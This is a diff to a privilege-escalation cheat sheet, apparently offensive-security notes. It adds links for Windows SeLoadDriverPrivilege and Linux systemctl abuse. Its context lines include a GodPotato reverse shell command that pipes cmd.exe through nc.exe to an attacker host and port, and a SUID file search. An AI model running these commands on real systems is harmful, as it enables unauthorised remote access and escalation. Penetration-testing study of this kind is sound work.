@@ -254,6 +254,10 @@ Reverse shell:
 .\GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe $lhost $lport"
 ```
 
+#### SeLoadDriverPrivilege:
+
+[Link here!](https://github.com/k4sth4/SeLoadDriverPrivilege)
+
 ## Linux
 
 Credits:
@@ -569,6 +573,10 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 
 Check in [GTFOBins](https://gtfobins.github.io)
+
+##### systemctl
+
+[Here is a link!](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)
 
 ##### cp
 ```
